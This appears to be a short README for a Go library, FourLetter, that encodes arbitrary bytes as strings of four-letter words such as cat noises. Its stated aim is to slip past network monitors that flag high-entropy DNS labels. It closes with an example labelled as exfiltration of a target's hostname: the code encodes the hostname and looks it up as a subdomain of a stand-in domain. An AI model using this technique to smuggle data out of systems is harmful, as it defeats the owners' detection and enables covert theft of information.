FourLetter
==========
Encode arbitrary bytes into four-letter words (or cat noises).

Some tools which watch network traffic look for high-entropy DNS labels.  This
is meant to get around that by encoding arbitrary bytes to a series of
four-letter (really four-byte) words.

For example, `ls -lart` turns into `meowmewwpurrmrowmewwmeowmewwmrowmeowmeowpurrmeowmrowmewwpurrmeowmeowmewwpurrmrowmrowmeowpurrmrowpurrmeowmewwmrowmeowmrowmewwmrow` using the default encoding.

Other, non-cat-noise words may be used.

Example
-------
Exfil of the target's hostname via DNS:
```go
h, err := os.Hostname()
if nil != err {
        panic(err)
}
net.Lookup(DefaultEncoding.EncodeToString(h) + ".example.com")
```
